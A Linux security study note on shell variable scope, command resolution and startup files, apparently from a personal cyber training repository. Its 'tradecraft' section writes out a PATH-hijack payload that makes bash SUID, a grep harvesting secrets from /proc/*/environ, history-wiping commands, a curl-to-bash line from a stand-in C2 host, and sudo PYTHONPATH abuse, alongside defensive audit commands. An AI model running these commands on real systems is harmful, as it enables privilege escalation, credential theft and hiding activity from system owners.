<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 14 — Shell Environment, Variable Scope & Command Resolution
   ========================================================================= -->

# 🛡️ Day 14: Shell Environment, Variable Scope & Command Resolution

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Shell State Architecture, Lookup Hierarchy, Path Hijacking & Memory Recon*

---

## 1. Shell Variable Scope & Memory Inheritance

When a shell initializes, it allocates an internal memory space for variables. These variables exist in two distinct scopes: **Local Shell Variables** and **Exported Environment Variables**.

```
  ┌────────────────────────────────────────────────────────┐
  │              PARENT PROCESS (Current Shell)            │
  │  - Local Var:      SECRET="123"  (Isolated)            │
  │  - Exported Var:   export API="xyz"                    │
  └──────────────────────────┬─────────────────────────────┘
                             │  fork() / execve()
                             ▼
  ┌────────────────────────────────────────────────────────┐
  │              CHILD PROCESS (Subshell / Script)         │
  │  - Reads:  API="xyz"         (Inherited from Parent)   │
  │  - Cannot: Access $SECRET    (Local variables drop)    │
  │  - Cannot: Modify Parent state (One-way inheritance)   │
  └────────────────────────────────────────────────────────┘
```

### Scope Comparison & Management

| Variable Type | Scope Boundary | Persistence | Management Commands |
| :--- | :--- | :--- | :--- |
| **Local Variable** | Current active shell session only | Lost upon process exit | `VAR="val"` (Set), `set` (List) |
| **Environment Var**| Passed to all child subshells & binaries | Active across child processes | `export VAR="val"`, `env` (List) |

```bash
# 1. Local vs Exported Demonstration
TARGET="10.10.10.50"                  # Local Variable
export DOMAIN="corp.local"            # Environment Variable

bash -c 'echo "Target: $TARGET | Domain: $DOMAIN"'
# Output: Target:  | Domain: corp.local (Local variable fails to pass to child)

# 2. Variable Deletion & Inspection
unset DOMAIN                          # Remove variable from shell memory
env                                   # Print all exported environment variables
printenv PATH                         # Print specific environment variable
```

---

## 2. Command Resolution Hierarchy (Lookup Sequence)

When an operator inputs a command string (e.g., `test`), the Linux shell does **not** check the filesystem immediately. It evaluates commands through a strict **5-stage resolution pipeline**:

```
                       [ USER TYPES COMMAND ]
                                  │
                                  ▼
                     ┌──────────────────────────┐
                     │ 1. Shell Aliases         │ ──( Match Found )──> [ Execute Alias ]
                     └────────────┬─────────────┘
                                  │ No
                                  ▼
                     ┌──────────────────────────┐
                     │ 2. Reserved Keywords     │ ──( Match Found )──> [ Execute Syntax (if/for) ]
                     └────────────┬─────────────┘
                                  │ No
                                  ▼
                     ┌──────────────────────────┐
                     │ 3. Shell Functions       │ ──( Match Found )──> [ Execute Function ]
                     └────────────┬─────────────┘
                                  │ No
                                  ▼
                     ┌──────────────────────────┐
                     │ 4. Shell Built-ins       │ ──( Match Found )──> [ Execute Kernel Subroutine ]
                     └────────────┬─────────────┘
                                  │ No
                                  ▼
                     ┌──────────────────────────┐
                     │ 5. $PATH Binary Search   │ ──( Left to Right )─> [ Execute Binary / 127 Error ]
                     └──────────────────────────┘
```

### Command Inspection Primitives

```bash
# Determine how the shell interprets a specific command name
type -a ls
# Output:
# ls is aliased to `ls --color=auto`
# ls is /usr/bin/ls

type -t cd                            # Output: builtin
type -t if                            # Output: keyword
command -v nmap                       # Fast binary resolution (POSIX standard for scripts)
```

---

## 3. Shell Startup & Profile Initialization Order

Startup scripts configure the shell environment. Attackers target these files to gain persistence, capture credentials, or tamper with runtime commands.

```
       [ Interactive Login Shell ]                      [ Interactive Non-Login Shell ]
       (e.g., SSH login, console /bin/login)            (e.g., Spawning terminal in GUI / Subshell)
                   │                                                   │
                   ▼                                                   ▼
       ┌────────────────────────┐                             ┌────────────────────────┐
       │   /etc/profile         │                             │   /etc/bash.bashrc     │
       └───────────┬────────────┘                             └───────────┬────────────┘
                   │                                                      │
                   ▼                                                      ▼
       ┌────────────────────────┐                             ┌────────────────────────┐
       │   ~/.bash_profile      │                             │   ~/.bashrc            │
       │   (or ~/.profile)      │                             └────────────────────────┘
       └───────────┬────────────┘
                   │
                   ▼
       ┌────────────────────────┐
       │   ~/.bashrc            │
       └────────────────────────┘
```

---

## 4. Core System Environment Variables

| Variable | System Definition | Security / Operational Focus |
| :--- | :--- | :--- |
| `$PATH` | Colon-delimited directory search path | Primary target for Binary Hijacking & DLL-style attacks |
| `$IFS` | Internal Field Separator (Space/Tab/Newline) | Modifying `$IFS` breaks string parsers in privileged scripts |
| `$PROMPT_COMMAND`| Command executed before displaying shell prompt | Covert persistence & terminal keystroke logging hook |
| `$HISTFILE` | Location where terminal history is written | Setting to `/dev/null` evades forensic session logs |
| `$LD_PRELOAD` | Shared library loaded before system libs | Rootkit hook & API function interception |
| `$SHELLOPTS` | Read-only list of active shell options | Auditing restricted shell environments (`rbash`) |

---

## 5. Threat Operations & Hacker Tradecraft

### Vector 1: `$PATH` Hijacking & Binary Planting
If `$PATH` contains relative directories (e.g., `.`), world-writable paths (`/tmp`), or if an administrator places custom scripts before standard paths (`/usr/local/bin:/usr/bin`):

```bash
# Current PATH: /tmp:/usr/local/bin:/usr/bin:/bin

# Scenario: SUID binary or administrative script executes 'service apache2 restart'
# (Fails to specify absolute path '/usr/sbin/service')

# Adversary drops payload into /tmp:
echo '#!/bin/bash' > /tmp/service
echo 'chmod +s /bin/bash' >> /tmp/service
chmod +x /tmp/service

# Execution: When 'service' is called, shell resolves /tmp/service first!
```

---

### Vector 2: Live Memory Credential Harvesting (`/proc`)
Environment variables often contain sensitive API keys, database passwords, and tokens. These remain unencrypted in kernel process memory:

```bash
# Dump environment variables of an active process
cat /proc/<PID>/environ | tr '\0' '\n'

# Search all running processes for exposed tokens:
grep -Ea "AWS_SECRET|API_KEY|DB_PASS|TOKEN" /proc/*/environ 2>/dev/null
```

---

### Vector 3: Anti-Forensic Shell Operations
Adversaries detach command logging by manipulating shell environment variables during live sessions:

```bash
# 1. Disable History Logging for Current Session
export HISTFILE=/dev/null
export HISTSIZE=0
set +o history

# 2. Leading Space Trick (If HISTCONTROL=ignorespace is enabled)
 echo "curl http://c2.local/payload.sh | bash"  # Space at start prevents history save
```

---

### Vector 4: Sudo Environment Preservation Abuse (`env_keep`)
When running `sudo`, security controls usually strip user environment variables to prevent privilege escalation. However, if `/etc/sudoers` contains `env_keep += "PYTHONPATH"` or `env_keep += "LD_PRELOAD"`:

```bash
# Exploit: Hijack python module loading under sudo
export PYTHONPATH=/tmp/evil_modules
sudo python3 /opt/admin_script.py
# -> Loads /tmp/evil_modules/__init__.py as ROOT
```

---

## 6. Defensive Threat Hunting & Auditing Matrix

| Tactical Objective | Auditing Command Syntax | Detection Goal |
| :--- | :--- | :--- |
| **Audit Unsafe `$PATH` Entries** | `echo "$PATH" \| grep -E "(^\|:)(\.\|/tmp)($\|:)"` | Detects relative or writable paths in search tree |
| **Detect Alias Poisoning** | `alias` | Identifies hijacked standard commands (`ls`, `sudo`) |
| **Audit Function Hijacking**| `declare -F` | Lists loaded shell functions overriding binaries |
| **Detect `$PROMPT_COMMAND` Hook**| `echo "$PROMPT_COMMAND"` | Identifies hidden session persistence triggers |
| **Check Sudo Environment Rules**| `sudo -l` | Verifies exposed `env_keep` or `SETENV` capabilities |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
